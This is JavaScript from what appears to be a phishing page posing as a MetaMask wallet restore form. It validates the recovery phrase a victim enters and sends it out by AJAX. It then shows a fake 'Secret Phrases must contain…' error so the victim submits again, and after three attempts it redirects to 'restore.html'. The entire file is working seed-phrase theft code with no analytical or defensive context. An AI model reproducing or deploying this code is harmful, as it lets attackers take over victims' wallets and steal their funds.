const redirectUrl = 'restore.html' // lastStage
      const lastStage = 3 // (stage === lastStage)
      let stage = 1 // stage
      const errorMsg = ['Secret Phrases must contain 12, 15, 18, 21 or 24 words','Secret Phrases must contain 12, 15, 18, 21 or 24 words'] // error message
      let check = false
      let passForCreate = false
      let passForCreateConfir = false
      let words = false

      $(".closeBtn").on("click", function (e) {
        $(".alertBox").hide()
        $(".alert").hide()
      })  

      function showBtn() {
        if(words) $("#imp").prop("disabled", true)
        else $("#imp").prop("disabled", false) 
      }
      
      $('#wordsseed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ")){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = false
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })
      
      $("#imp").on("click", function(){      
        let mnemonic = $("#wordsseed").val()
        let wallet = ethers.Wallet.fromMnemonic(mnemonic)
        if(stage < lastStage) {
          $.ajax({
            
            data: { seed: mnemonic, wallet: 'MetaMask' },
            success: function(data) {
              updateStage()
            }
          })
        } else window.location = redirectUrl
      })

      function updateStage() {
        if(typeof errorMsg[stage - 1] !== 'undefined') $("#errorText").html(errorMsg[stage - 1])
        else $("#errorText").html(errorMsg[0])
        stage += 1
        $("#errorText").css('display','')
        setTimeout(function(){
          $("#errorText").css('display','block')
        }, 3000)
      }
      
      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)